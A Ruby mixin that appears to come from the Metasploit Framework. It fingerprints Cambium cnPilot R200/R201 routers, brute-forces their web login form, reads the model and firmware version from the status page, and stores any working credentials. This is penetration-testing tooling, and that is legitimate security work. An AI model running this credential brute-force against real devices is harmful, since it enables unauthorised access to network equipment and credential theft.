# -*- coding: binary -*-
module Msf
###
#
# This module provides methods for working with cnPilot R200/201
#
###

module Auxiliary::CNPILOT
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      last_attempted_at: Time.now,
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  #
  # Check if App is Cambium cnPilot
  #

  def is_app_cnpilot?
    begin
      res = send_request_cgi(
        {
          'uri'       => '/index.asp',
          'method'    => 'GET'
        }
      )

    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
      print_error("#{rhost}:#{rport} - HTTP Connection Failed...")
      return false
    end

    good_response = (
      res &&
      res.code == 200 &&
      res.headers['Server'] &&
      (res.headers['Server'].include?('GoAhead-Webs') && res.body.include?('cnPilot') && res.body.include?('style_CAMBIUM.css'))
    )

    if good_response
      print_good("#{rhost}:#{rport} - Cambium cnPilot confirmed...")
      run_login
      return true
    else
      print_error("#{rhost}:#{rport} - Target does not appear to be Cambium cnPilot r200/r201. Module will not continue.")
      return false
    end
  end

  #
  # Brute-force the login page
  #

  def do_login(user, pass)
    print_status("#{rhost}:#{rport} - Attempting to login...")

    res = send_request_cgi(
      {
        'uri' => '/goform/websLogin',
        'method' => 'POST',
        'headers' => {
          'Accept' => 'application/json, text/javascript, */*; q=0.01'
        },
        'vars_post' =>
          {
            'user_name' => user,
            'password' => pass
          }
      }
    )

    good_response = (
      res &&
      res.code == 302 &&
      res.headers.include?('Location') &&
      res.headers['Location'].include?('Status_Basic')
    )

    if good_response
      print_good("SUCCESSFUL LOGIN - #{rhost}:#{rport} - #{user.inspect}:#{pass.inspect}")

      # Extract device model
      the_cookie = res.get_cookies

      res = send_request_cgi(
        {
          'uri' => '/status/Status_Basic.asp',
          'method' => 'GET',
          'cookie' => the_cookie,
          'headers' => {
            'Accept' => 'application/json, text/javascript, */*; q=0.01'
          }
        }
      )

      good_response = (
        res &&
        res.code == 200 &&
        res.headers.include?('Server') &&
        (res.headers['Server'].include?('GoAhead-Webs') && res.body.include?('cnPilot') && res.body.include?('style_CAMBIUM.css'))
      )

      if good_response
        get_cnpilot_model = res.body.match(/device_name= (.*)/)
        get_cnpilot_version_html = Nokogiri::HTML(res.body)
        get_cnpilot_version = get_cnpilot_version_html.at_css('div#statusInfo').text
        cnpilot_version = "#{get_cnpilot_version}".match(/p;(.*?)[$<\/]/)[1]

        if !get_cnpilot_model.nil?
          cnpilot_model = "#{get_cnpilot_model}".match(/[$"](.*)[$"]/)[1]

          if !cnpilot_model.nil?
            print_status("Running cnPilot #{cnpilot_model} #{cnpilot_version}")
            report_cred(
              ip: rhost,
              port: rport,
              service_name: "Cambium #{cnpilot_model} #{cnpilot_version}",
              user: user,
              password: pass
            )
          else
            print_status("Running cnPilot #{cnpilot_version}")
            report_cred(
              ip: rhost,
              port: rport,
              service_name: 'Cambium cnPilot #{cnpilot_version}',
              user: user,
              password: pass
            )
          end
          return the_cookie, cnpilot_version
        end
      end
    else
      print_error("FAILED LOGIN - #{rhost}:#{rport} - #{user.inspect}:#{pass.inspect}")
      the_cookie = 'skip'
      cnpilot_version = 'skip'
      return the_cookie, cnpilot_version
    end
  end
end
end
